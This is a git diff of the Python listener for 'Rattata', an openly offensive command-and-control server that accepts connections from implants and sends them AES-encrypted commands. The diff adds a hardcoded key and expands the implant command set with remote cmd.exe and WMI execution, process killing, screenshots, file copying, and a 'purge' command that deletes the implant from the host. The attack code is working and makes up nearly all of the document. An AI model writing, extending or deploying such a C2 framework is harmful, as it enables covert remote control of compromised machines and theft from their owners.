@@ -3,15 +3,10 @@ from Crypto import Random
 from Crypto.Cipher import AES
 
 # This is the key for the AES encryption, can be modified
-CIPHER = ("LUJw_q7aaSNPSU=aSX*!9TU&n#Y&yh2-2+L*")
+CIPHER = ("32_rFE2Z@M4KSJYy6w2KgzH9fCYfD=&bPj?e")
 
 # Create list to hold threads
 threads = []
-
-# Append new sessions to threads list and start new thread
-def newThread(session):
-  global threads
-  threads.append(session)
 
 # Implement AES encryption
 class AESCipher(object):
@@ -48,23 +43,82 @@ class AESCipher(object):
 cipher = AESCipher(key=CIPHER)
 
 # Create help menu for implant
-def helpMenu():
+def helpMenu(command):
   help = """
-cd		- Change current directory
-back		- Return to main menu
-download	- Download specified file (Under construction)
-getpid		- Get current process ID
-help		- Display help menu
-hostname	- Get system hostname
-ls		- List directory files
-ps		- Get process list (Windows implant only)
-pwd		- Get present working directory
-shell		- Execute command via cmd.exe
-sysinfo		- Recieve system information (Windows implant only)
-upload		- Upload specified file (Under construction)
-whoami		- Get current username
+[*] For command specific help, Use: help <command>
+
+  back		- Return to main menu
+  cd		- Change current directory
+  cp		- Copy file to new location (specify with full UNC paths)
+  getpid	- Get current process ID
+  getuid	- Get current username
+  help		- Display help menu
+  hostname	- Get system hostname
+  kill		- Kill specified process ID
+  ls		- List directory files
+  ps		- Get process list
+  purge		- Exit session and self delete implant from system
+  pwd		- Get present working directory
+  screenshot	- Take screenshot of current user's Desktop
+  shell		- Execute command via cmd.exe
+  sysinfo	- Recieve system information
+  wmi		- Execute specified command via WMI
 """
-  print(help)
+  if command == '':
+    print(help)
+  elif command == 'help' or command == '?':
+    print(help)
+  elif 'help ' in command or '? ' in command:
+    params = command.split()
+    if params[1] == 'back':
+      print('\n  Usage: back')
+      print('  Returns to main menu\n')
+    elif params[1] == 'cd':
+      print('\n  Usage: cd <full path to directory>')
+      print('  Change current directory\n')
+    elif params[1] == 'cp':
+      print('\n  Usage: cp <full path to file> <full path to new location> (MUST USE FULL UNC PATH!)')
+      print('  Copy file to new location\n')
+    elif params[1] == 'getpid':
+      print('\n  Usage: getpid')
+      print('  Get current process ID\n')
+    elif params[1] == 'getuid':
+      print('\n  Usage: getuid')
+      print('  Get current username\n')
+    elif params[1] == 'hostname':
+      print('\n  Usage: hostname')
+      print('  Get system hostname\n')
+    elif params[1] == 'kill':
+      print('\n  Usage: kill <process ID>')
+      print('  Kill specified process ID\n')
+    elif params[1] == 'ls':
+      print('\n  Usage: ls')
+      print('  List directory files\n')
+    elif params[1] == 'ps':
+      print('\n  Usage: ps')
+      print('  Get process list\n')
+    elif params[1] == 'purge':
+      print('\n  Usage: purge')
+      print("  Exit session and self delete implant from system\n")
+    elif params[1] == 'pwd':
+      print('\n  Usage: pwd')
+      print('  Get present working directory\n')
+    elif params[1] == 'screenshot':
+      print('\n  Usage: screenshot <path to save screenshot as .bmp file>')
+      print("  Take screenshot of current user's Desktop\n")
+    elif params[1] == 'shell':
+      print('\n  Usage: shell <command to run>')
+      print("  Execute command via cmd.exe\n")
+    elif params[1] == 'sysinfo':
+      print('\n  Usage: sysinfo')
+      print("  Recieve system information\n")
+    elif params[1] == 'wmi':
+      print('\n  Usage: wmi <command to run>')
+      print("  Execute specified command via WMI\n")
+    else:
+      pass
+  else:
+    pass
 
 # Create help menu for main menu
 def mainMenu():
@@ -78,7 +132,7 @@ quit or exit	- Exit Rattata
 
 # Create startup banner
 def banner():
-  print """
+  print("""
 #############################################
 #      ____        __  __        __         #
 #     / __ \____ _/ /_/ /_____ _/ /_____ _  #
@@ -89,7 +143,7 @@ def banner():
 #             By: @airzero24                #
 #                                           #
 #############################################
-"""
+""")
 # Create threads for each implant
 class implantThread(threading.Thread):
   def __init__(self,connections,details):
@@ -107,18 +161,26 @@ def interactImplant(command):
     while True:
       command = raw_input(implant + ":rattata>")
       if command == '':
-        helpMenu()
+        helpMenu(command)
       elif command == 'help' or command == '?':
-        helpMenu()
+        helpMenu(command)
+      elif 'help ' in command or '? ' in command:
+        helpMenu(command)
       elif command == 'quit' or command == 'exit' or command == 'back':
+        break
+      elif command == 'purge':
+        encrypted = cipher.encrypt(command)
+        connection.send(encrypted)
+        print("[+] Sent command '" + str(command) + "' to implant!\n")
+        print("[!] Session has been closed and implant has been purged from system.\n")
         break
       else:
         encrypted = cipher.encrypt(command)
         connection.send(encrypted)
-        print "[+] Sent command '" + str(command) + "' to implant!"
+        print("[+] Sent command '" + str(command) + "' to implant!")
         result = connection.recv(16384)
         decrypted = cipher.decrypt(result)
-        print "[+] Result from implant:\n" + str(decrypted)
+        print("[+] Result from implant:\n" + str(decrypted))
 
 # Define main function
 if __name__ == '__main__':
@@ -135,10 +197,10 @@ if __name__ == '__main__':
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.bind((sys.argv[1],int(sys.argv[2])))
       s.listen(99)
-      print "[*] Waiting for connection...\n"
+      print("[*] Waiting for connection...\n")
       while True:
         (connection, details) = s.accept()
-        print "[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n"
+        print("[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n")
         newThread =  implantThread(connection, details)
         threads.append(newThread)
         while True:
@@ -146,30 +208,30 @@ if __name__ == '__main__':
           if command == 'help' or command == '?':
             mainMenu()
           elif command == 'list':
-            print "[*] Available implant connections\n"
+            print("[*] Available implant connections\n")
             if threads == []:
-              print "[!] No available implants sessions.\n"
+              print("[!] No available implants sessions.\n")
             else:
               counter = 0
-              print "[*] Format: <session_id> <ipaddress:port>\n"
+              print("[*] Format: <session_id> <ipaddress:port>\n")
               for thread in threads:
                 counter = counter + 1
-                print " " + str(counter) + " " + str(thread.details[0]) + ":" + str(thread.details[1])  +" (Established)"
-                print "\n"
+                print(" " + str(counter) + " " + str(thread.details[0]) + ":" + str(thread.details[1])  +" (Established)")
+              print("\n")
           elif command == 'interact':
-            print "[!] Usage: interact <session_id>\n"
+            print("[!] Usage: interact <session_id>\n")
           elif command == 'quit' or command == 'exit':
-            print "[*] Exiting Rattata...\n"
+            print("[*] Exiting Ratatat...\n")
             os.system('kill $PPID')
           elif command == 'checkconns':
             (connection, details) = s.accept()
-            print "[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n"
+            print("[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n")
             newThread =  implantThread(connection, details)
             threads.append(newThread)
           elif 'interact ' in command:
             interactImplant(command)
           else:
-            print "\n[!] No implant sessions have been established to execute commands.\n"
+            print("\n[!] No implant sessions have been established to execute commands.\n")
 
     # Kill process on keyboard interrupt
     except KeyboardInterrupt:
